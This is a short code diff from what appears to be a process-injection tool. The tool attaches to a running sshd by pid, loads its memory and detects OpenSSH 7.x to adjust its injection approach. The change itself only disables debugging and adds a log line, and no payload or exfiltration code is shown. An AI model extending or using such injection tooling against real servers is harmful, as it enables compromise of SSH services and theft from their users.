@@ -26,7 +26,7 @@ void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
 	info("you gave me pid %d\n", pid);
 
 	ctx->pid = pid;
-	ctx->debug = 1;
+	ctx->debug = 0;
 	_attach(ctx->pid);
 
 	info("slurping stuff to memory..");
@@ -63,6 +63,7 @@ void inject_ctx_init(inject_ctx *ctx, pid_t pid) {
 	for(i = 0; i < sz; i++) {
 		if (memcmp(sshd_buf + i, "OpenSSH_7", 9) == 0) {
 			ctx->is_openssh7 = 1;
+			info("oh, we're dealing with OpenSSH 7.x, switching some strategies..");
 			break;
 		}
 	}
